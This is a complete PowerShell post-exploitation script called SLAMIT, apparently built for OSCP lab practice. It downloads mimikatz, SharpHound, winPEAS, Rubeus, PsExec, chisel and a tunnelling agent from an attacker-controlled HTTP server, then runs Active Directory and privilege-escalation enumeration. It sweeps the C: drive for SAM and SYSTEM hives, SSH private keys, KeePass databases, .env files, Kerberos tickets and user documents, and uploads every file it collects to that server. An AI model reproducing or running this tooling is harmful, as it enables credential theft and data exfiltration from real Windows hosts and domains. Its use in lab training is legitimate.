# =============================================================================
# SLAMIT - Windows System Enumeration and File Exfiltration Tool
# =============================================================================
# 
# This PowerShell script performs comprehensive Windows system enumeration
# and uploads interesting files to a web server. It includes:
# - Tool downloads (mimikatz, SharpHound, winPEAS, etc.)
# - Active Directory enumeration (SharpHound)
# - System enumeration (winPEAS)
# - File discovery and upload
# 
# =============================================================================

# $uri = "http://192.168.45.163:80";
$uri = "http://10.10.202.153:80" # set up a ligolo listener first!
$baseDir = "/home/kali/projects/oscp";
$mainDir = "challenges";
$proj = "oscp_c";
# $hn = [System.Net.Dns]::GetHostName();
$hn = "MS02"
$targetFolder = "$baseDir/$mainDir/$proj/$hn";

Set-Location "C:\Users\Public"
$thisDir = Get-Location

# Function to create centered section headers
function Write-SectionHeader {
    param([string]$Title)
    
    $width = 90
    $borderChar = "#"
    $paddingChar = " "
    
    # Top border
    Write-Host ($borderChar * $width) -ForegroundColor Cyan
    
    # Empty line
    $emptyLine = $borderChar + ($paddingChar * ($width - 2)) + $borderChar
    Write-Host $emptyLine -ForegroundColor Cyan
    
    # Centered header
    $innerWidth = $width - 2
    $textLen = $Title.Length
    $leftPad = [math]::Floor(($innerWidth - $textLen) / 2)
    $rightPad = $innerWidth - $textLen - $leftPad
    
    $headerLine = $borderChar + ($paddingChar * $leftPad) + $Title + ($paddingChar * $rightPad) + $borderChar
    Write-Host $headerLine -ForegroundColor Cyan
    
    # Empty line
    Write-Host $emptyLine -ForegroundColor Cyan
    
    # Bottom border
    Write-Host ($borderChar * $width) -ForegroundColor Cyan
    Write-Host ""
}

# Function to create centered completion messages
function Write-CompletionMessage {
    param([string]$Message)
    
    $width = 90
    $borderChar = "="
    $paddingChar = " "
    
    # Top border
    Write-Host ($borderChar * $width) -ForegroundColor Green
    
    # Centered message
    $innerWidth = $width - 2
    $textLen = $Message.Length
    $leftPad = [math]::Floor(($innerWidth - $textLen) / 2)
    $rightPad = $innerWidth - $textLen - $leftPad
    
    $messageLine = $borderChar + ($paddingChar * $leftPad) + $Message + ($paddingChar * $rightPad) + $borderChar
    Write-Host $messageLine -ForegroundColor Green
    
    # Bottom border
    Write-Host ($borderChar * $width) -ForegroundColor Green
    Write-Host ""
}

@"
 .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |    _______   | || |   _____      | || |      __      | || | ____    ____ | || |     _____    | || |  _________   | |
| |   /  ___  |  | || |  |_   _|     | || |     /  \     | || ||_   \  /   _|| || |    |_   _|   | || | |  _   _  |  | |
| |  |  (__ \_|  | || |    | |       | || |    / /\ \    | || |  |   \/   |  | || |      | |     | || | |_/ | | \_|  | |
| |   '.___`-.   | || |    | |   _   | || |   / ____ \   | || |  | |\  /| |  | || |      | |     | || |     | |      | |
| |  |`\____) |  | || |   _| |__/ |  | || | _/ /    \ \_ | || | _| |_\/_| |_ | || |     _| |_    | || |    _| |_     | |
| |  |_______.'  | || |  |________|  | || ||____|  |____|| || ||_____||_____|| || |    |_____|   | || |   |_____|    | |
| |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
            ....................................................................................................
            ....................................................................................................
            ..............................................%%+***#%..............................................
            ............................................##%%....#%+%............................................
            ............................................%*%......%*%............................................
            .............................................%+@....@%%*............................................
            .............................................%+%....%+%.............................................
            ..............................................%*%..%+%..............................................
            ...............................................%%%%%%...............................................
            ..............................................%*+***+%..............................................
            ..............................................%+***+*%..............................................
            ..............................................%%%%%%%%..............................................
            ..............................................%***+++%..............................................
            ..............................................%***++*%..............................................
            ..............................................%%%%%%%%..............................................
            ..............................................%+++*++%..............................................
            ..............................................%*+****%..............................................
            ................................%.............%%%%%%%%..............................................
            .................................%.....:......%****++%.......%......................................
            ..................................%....@......%+*****%......%......#................................
            ...................................%....%.....%%%%%%*%......%.....%.................................
            ..............................................%*+****%...........%..................................
            ..............................................%******%....................-%........................
            ..........................%...................%*+****%...................%..........................
            ............................%...%%%########***++============+++*#%%%...%............................
            ...............................%-=%=========-=============-====--%=-@...............................
            ...............................%-=%======-==-=-==================%=-@...............................
            .....................%%........%==%===--========================-%-=%........@@.....................
            ...............................%==%======-=====-=================%==%....@%+........................
            ...............................%==%================--======-=====%==%...............................
            ...............................%==%==============================%==%...............................
            ....................#@:........%=-%=========-=====%%=============%==%........*%.....................
            ......................+%:-:=+--%-=%=====-==%%=====%%====-+%======%==%--@%---%+......................
            ........................%%%-----:%%%%%%%%%%%%*%@@%--%%%%%-%%%%%%%%%-------%#@.......................
            ........................%##%%%--------------%--%%%--%#%--%-------------%%###@.......................
            ........................%##%---%%:------%%*:%--------:---%--=%------%%--:###@.......................
            .......................:###%----@%:------%-----%----:-------%=----%-----:###@.......................
            ..................%%%:.-###%--%@---------------%%:-:%:-------------:%@--:###@.......................
            .......................:###%%-----------%%@----%#%%%%--:%%:------------%%###@.......................
            ........................#%#%@@%%%%%%%:----:%##%%#%#%%%##%-----%%%%%%%%%%%%%#@.......................
            ........................###%--------%-----:%#####%%%###%%------%--------=###@.......................
            ........................###@-------%----%%%%%%##%#%#%%%%%%%@----%-------:###@.......................
            ........................###@------%--%%------%%%##%###%------@%--%-------%##@.......................
            ........................###@-----%%---------%%%-:%%%@%%@--------@%%------%##@.......................
            ........................###@%@%------------%------%-----%#---------------%##@.......................
            ........................###@%%----------+%--------%-------%--------------%##@.......................
            ........................###@------------%------------------%-------------%##@.......................
            .......................:###%#%%%%%%@%%%@@@@@@@@@@%%%%@@%@%@@%%%%%%%%@@@@%%##@.......................
            .......................=####################################################@.......................
            ........................%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%........................
            .............................................%#########*............................................
            .............................................%##########............................................
            .....................................%#########################.....................................
            ......................................::::::::::::::::::::::::......................................
"@ | Write-Host

Write-SectionHeader "Download Tools"

try
{
    # Invoke-WebRequest -Uri "$uri/SysinternalsSuite.zip" -O SysinternalsSuite.zip
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/mimikatz64.exe" -Outfile mimikatz.exe
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/SharpHound.exe" -Outfile SharpHound.exe
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/winPEASx64.exe" -Outfile winPEAS.exe
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/PowerView.ps1" -Outfile PowerView.ps1
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/PowerUp.ps1" -Outfile PowerUp.ps1
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/PsExec64.exe" -Outfile PsExec.exe
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/Rubeus.exe" -Outfile Rubeus.exe
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/chisel_win" -Outfile chisel.exe
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/agent.exe" -Outfile agent.exe
    Invoke-WebRequest -UseBasicParsing -Uri "$uri/custom_upload.ps1" -Outfile custom_upload.ps1
}
catch
{
    Write-Error "Downloads failed: Error: $_"
}

Write-CompletionMessage "Download Tools Complete"


Write-SectionHeader "Active Directory Enumeration (SharpHound)"
try
{
    $exePath = "$thisDir\Sharphound.exe"
    Start-Process "$exePath" -ArgumentList "-c", "all"
}
catch
{
    Write-Error "Sharphound failed: Error: $_"
}

Write-CompletionMessage "SharpHound Enumeration Complete"

Write-SectionHeader "System Enumeration (winPEAS)"
try
{
    $exePath = "$thisDir\winPEAS.exe"
    $outputFile = "$thisDir\winPEAS_out.txt"
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = $exePath
    $startInfo.RedirectStandardOutput = $true
    $startInfo.RedirectStandardError = $true
    $startInfo.UseShellExecute = $false
    $startInfo.CreateNoWindow = $true
    $startInfo.StandardOutputEncoding = [System.Text.Encoding]::UTF8
    $startInfo.StandardErrorEncoding = [System.Text.Encoding]::UTF8
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $startInfo
    $null = $process.Start()
    $output = $process.StandardOutput.ReadToEnd()
    $errorOutput = $process.StandardError.ReadToEnd()
    $process.WaitForExit()
    # Combine outputs
    $fullOutput = $output + "`r`n" + $errorOutput
    # Save output to file
    $fullOutput | Out-File -FilePath $outputFile -Encoding UTF8
}
catch
{
    Write-Error "winPEAS failed! Error: $_"
}

Write-CompletionMessage "winPEAS Enumeration Complete"

Write-SectionHeader "File Discovery and Collection"
# File extensions to include
$extensions = @(
    '*.txt', '*.log', '*.pdf', '*.zip', '*.doc', '*.docx', '*.xls', '*.xlsx',
    '*.ppt', '*.pptx', '*.csv', '*.ini', '*.conf', '*.cfg', '*.env',
    '*.yaml', '*.yml', '*.json', '*.xml', '*.ps1', '*.bat', '*.cmd', '*.sh',
    '*.kdbx', '*.rdp', '*.7z', '*.rar', '*.tar', '*.gz', '*.bak', '*.old',
    '*.tmp', '*.db', '*.sqlite', '*.sqlite3', '*.mdb', '*.accdb', '*.rtf', '*.md',
    '*.kerberoast', '*.kirb', "*.exe"
)
# Add interesting files
$interestingFiles = @(".git*", "id_rsa", "id_ecdsa", "local.txt", "proof.txt", "SAM", "SYSTEM")

# Define source and destination
$sourceRoot = "C:\"

try {
    $allFiles = @()

    # Search for interesting files
    foreach ($if in $interestingFiles) {
        $found = Get-ChildItem -Path $sourceRoot -Recurse -Filter $if -File -ErrorAction SilentlyContinue
        if ($found) {
            $allFiles += $found
        }
    }

    # Search Users folder for extensions
    $sourceRoot += "Users"
    foreach ($ext in $extensions) {
        $found = Get-ChildItem -Path $sourceRoot -Recurse -Filter $ext -File -ErrorAction SilentlyContinue `
            -Exclude "mimikatz*", "SharpHound*", "winPEAS", "PowerView*", "PowerUp*", "BloodHound*", "custom_upload*"
        if ($found) {
            $allFiles += $found
        }
    }

    foreach ($file in $allFiles) {
        # Sanitize original path for use in filename
        $sanitizedPath = ($file.DirectoryName -replace "[:\\]", "_")  # Replace invalid chars with "_"

        # Base name logic: If SAM or SYSTEM, append part of path
        if ($file.Name -match "^(SAM|SYSTEM)$") {
            $newFileName = "$($file.Name)_$sanitizedPath"
        }
        else {
            $newFileName = $file.Name
        }

        $targetPath = Join-Path -Path $thisDir -ChildPath $newFileName
        $counter = 1

        # Handle conflicts by adding -1, -2, etc.
        while (Test-Path $targetPath) {
            $baseName = [System.IO.Path]::GetFileNameWithoutExtension($newFileName)
            $extension = [System.IO.Path]::GetExtension($newFileName)
            $targetPath = Join-Path -Path $thisDir -ChildPath "$baseName-$counter$extension"
            $counter++
        }

        # Copy file
        try {
            Copy-Item -Path $file.FullName -Destination $targetPath -ErrorAction Stop
            Write-Host "Copied: $($file.FullName) → $targetPath"
        }
        catch {
            Write-Warning "Failed to copy: $($file.FullName) — $_"
        }
    }

}
catch {
    Write-Warning "Script failed: $_"
}

Write-CompletionMessage "File Discovery and Collection Complete"


Write-SectionHeader "File Upload"
try
{
    # Collect all matching files that have been copied or moved to the current directory.
    $files = @()
    foreach ($ext in $extensions)
    {
        $found = Get-ChildItem -Path $thisDir -Recurse -Filter $ext -File -ErrorAction SilentlyContinue `
            -Exclude "mimikatz*", "SharpHound*", "winPEAS", "PowerView*", "PowerUp*", "BloodHound*"
        if ($found)
        {
            $files += $found
        }
        $found = Get-ChildItem -Path $thisDir -Recurse -Filter ".git*" -File -ErrorAction SilentlyContinue `
            -Exclude "mimikatz*", "SharpHound*", "winPEAS", "PowerView*", "PowerUp*", "BloodHound*"
        if ($found)
        {
            $files += $found
        }
    }

    Write-Host "Starting upload of $($files.Count) files..." -ForegroundColor Yellow
    
    $uploadCount = 0
    $successCount = 0
    $failedCount = 0
    
    foreach ($file in $files) {
        $uploadCount++
        try {
            $fileBytes = [System.IO.File]::ReadAllBytes($file)
            $boundary = [System.Guid]::NewGuid().ToString()
            $lf = "`r`n"
            $fileName = [System.IO.Path]::GetFileName($file)

            # Folder part
            $folderPart = "--$boundary$lf" +
                        "Content-Disposition: form-data; name=`"folder`"$lf$lf" +
                        "$targetFolder$lf"

            # File part
            $fileHeader = "--$boundary$lf" +
                        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$lf" +
                        "Content-Type: application/octet-stream$lf$lf"

            # Footer
            $footer = "$lf--$boundary--$lf"

            # Convert header strings to bytes
            $encoding = [System.Text.Encoding]::ASCII
            $folderBytes = $encoding.GetBytes($folderPart)
            $fileHeaderBytes = $encoding.GetBytes($fileHeader)
            $footerBytes = $encoding.GetBytes($footer)

            # Construct full body
            $bodyBytes = New-Object byte[] ($folderBytes.Length + $fileHeaderBytes.Length + $fileBytes.Length + $footerBytes.Length)
            [System.Array]::Copy($folderBytes, 0, $bodyBytes, 0, $folderBytes.Length)
            [System.Array]::Copy($fileHeaderBytes, 0, $bodyBytes, $folderBytes.Length, $fileHeaderBytes.Length)
            [System.Array]::Copy($fileBytes, 0, $bodyBytes, $folderBytes.Length + $fileHeaderBytes.Length, $fileBytes.Length)
            [System.Array]::Copy($footerBytes, 0, $bodyBytes, $folderBytes.Length + $fileHeaderBytes.Length + $fileBytes.Length, $footerBytes.Length)

            # Upload using Invoke-WebRequest (silent)
            $null = Invoke-WebRequest -UseBasicParsing -Uri $uri -Method Post -Body $bodyBytes -ContentType "multipart/form-data; boundary=$boundary" -ErrorAction SilentlyContinue
            $successCount++
        }
        catch {
            $failedCount++
        }
    }

    # Pretty print summary
    Write-Host ""
    Write-Host "╔══════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║                              UPLOAD SUMMARY                                 ║" -ForegroundColor Cyan
    Write-Host "╠══════════════════════════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
    Write-Host "║  Total Files Processed: $($uploadCount.ToString().PadLeft(8))                                                    ║" -ForegroundColor White
    Write-Host "║  Successfully Uploaded: $($successCount.ToString().PadLeft(8))                                                    ║" -ForegroundColor Green
    Write-Host "║  Failed Uploads:        $($failedCount.ToString().PadLeft(8))                                                    ║" -ForegroundColor Red
    Write-Host "╚══════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host ""
}
catch
{
    Write-Error "Upload Files failed: Error: $_"
}

Write-CompletionMessage "File Upload Complete"

# Final completion message
Write-Host ""
Write-SectionHeader "SLAMIT COMPLETE"
Write-Host "All operations completed successfully!" -ForegroundColor Green
Write-Host "Check the current directory for collected files and enumeration results." -ForegroundColor Yellow
Write-Host ""
